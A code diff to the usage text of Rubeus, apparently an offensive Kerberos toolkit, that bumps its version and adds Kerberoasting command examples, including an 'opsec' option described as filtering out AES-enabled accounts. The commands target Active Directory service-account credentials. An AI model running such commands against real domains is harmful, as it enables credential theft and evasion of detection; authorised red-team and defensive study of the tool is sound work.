@@ -12,7 +12,7 @@ namespace Rubeus.Domain
             Console.WriteLine("  |  __  /| | | |  _ \\| ___ | | | |/___)");
             Console.WriteLine("  | |  \\ \\| |_| | |_) ) ____| |_| |___ |");
             Console.WriteLine("  |_|   |_|____/|____/|_____)____/(___/\r\n");
-            Console.WriteLine("  v1.3.5\r\n");
+            Console.WriteLine("  v1.3.6\r\n");
         }
 
         public static void ShowUsage()
@@ -87,8 +87,14 @@ Roasting:
     Perform Kerberoasting with an existing TGT:
         Rubeus.exe kerberoast /spn:""blah/blah"" </ticket:BASE64 | /ticket:FILE.KIRBI>
 
-    Perform Kerberoasting using the tgtdeleg ticket to requestion service tickets:
-        Rubeus.exe kerberoast /spn:""blah/blah"" /usetgtdeleg
+    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
+        Rubeus.exe kerberoast /usetgtdeleg
+
+    Perform ""opsec"" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
+        Rubeus.exe kerberoast /rc4opsec
+
+    Perform AES Kerberoasting:
+        Rubeus.exe kerberoast /aes
 
     Perform AS-REP ""roasting"" for any users without preauth:
         Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
